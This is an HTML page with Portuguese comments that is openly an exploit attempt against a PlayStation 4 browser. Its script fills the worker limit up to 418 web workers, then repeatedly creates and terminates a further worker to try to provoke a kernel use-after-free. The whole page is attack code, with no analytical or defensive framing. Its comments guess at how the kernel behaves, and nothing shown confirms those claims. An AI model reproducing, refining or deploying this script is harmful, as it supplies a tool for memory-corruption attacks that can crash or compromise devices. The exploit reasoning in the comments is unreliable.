<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>PS4 Golden Slot 418 Attack</title>
    <style>
        body { 
            background-color: #050; 
            color: #fff; 
            font-family: 'Courier New', monospace; 
            text-align: center; 
            padding: 20px;
            display: flex; flex-direction: column; justify-content: center; height: 90vh;
        }
        h1 { font-size: 2em; text-shadow: 0 0 10px #0f0; margin-bottom: 10px; }
        #counter { font-size: 7em; font-weight: bold; margin: 10px 0; color: #0f0; }
        #status { font-size: 1.5em; border: 2px solid #fff; padding: 10px; background: #000; }
        .pulse-box { margin-top: 20px; font-size: 1.2em; color: #ff0; display: none; }
        
        @keyframes pulse-anim {
            0% { background-color: #300; }
            50% { background-color: #f00; }
            100% { background-color: #300; }
        }
        .critical { animation: pulse-anim 1s infinite; border-color: #ff0 !important; }
    </style>
</head>
<body>

    <h1>GOLDEN SLOT 418</h1>
    <div id="status">INICIANDO ENCHIMENTO...</div>
    <div id="counter">0</div>
    <div id="pulseInfo" class="pulse-box">
        MODO PULSO ATIVO<br>
        Tentando corromper slot 419...
    </div>

    <script>
        // CONFIGURAÇÃO BASEADA NOS SEUS TESTES
        const TARGET_HOVER = 418; // O ponto do congelamento
        
        let workers = [];
        // Worker Passivo (Enchimento)
        const blob = new Blob(["setInterval(()=>{}, 100000)"], {type:'text/javascript'});
        const url = URL.createObjectURL(blob);
        
        // Worker Kamikaze (Ataque Rápido)
        const killerBlob = new Blob(["self.close()"], {type:'text/javascript'});
        const killerUrl = URL.createObjectURL(killerBlob);

        function updateDisplay() {
            document.getElementById('counter').innerText = workers.length;
        }

        // FASE 1: Subir até 418 com segurança
        function startClimb() {
            let i = setInterval(() => {
                // Sobe rápido até 400
                if (workers.length < 400) {
                    for(let k=0; k<5; k++) workers.push(new Worker(url));
                } 
                // Sobe devagar de 400 até 418
                else if (workers.length < TARGET_HOVER) {
                    workers.push(new Worker(url));
                } 
                // Chegou em 418: PARA e muda de modo
                else {
                    clearInterval(i);
                    updateDisplay();
                    startGoldenPulse();
                    return;
                }
                updateDisplay();
            }, 50); // Velocidade controlada
        }

        // FASE 2: O Pulso (Exploit)
        // Estamos em 418. O sistema deve estar lento/congelando.
        // Tentamos criar o 419 e matar imediatamente.
        function startGoldenPulse() {
            const status = document.getElementById('status');
            const info = document.getElementById('pulseInfo');
            
            status.innerText = "ALVO ATINGIDO (418). INICIANDO PULSO...";
            status.className = "critical"; // Piscar vermelho
            info.style.display = "block";

            // Loop de Pulso Lento (para não crashar o browser, apenas o kernel)
            setInterval(() => {
                try {
                    // Tenta alocar o slot 419 (Bater na porta)
                    const w = new Worker(killerUrl);
                    
                    // Se o sistema estiver congelado, o terminate pode demorar
                    // Se o Kernel limpar o ponteiro antes da thread morrer = UAF
                    w.terminate(); 
                    
                    // Feedback visual sutil (ponto no status)
                    status.innerText += ".";
                    if(status.innerText.length > 50) status.innerText = "PULSANDO NO SLOT 419";
                    
                } catch(e) {
                    // Se falhar a criação, o Kernel está 100% cheio.
                    // Isso é bom. Significa que estamos pressionando o limite.
                }
            }, 500); // 1 tentativa a cada meio segundo (sincronizado com o lag do sistema)
        }

        // Inicia após 2 segundos
        setTimeout(startClimb, 2000);

    </script>
</body>
</html>
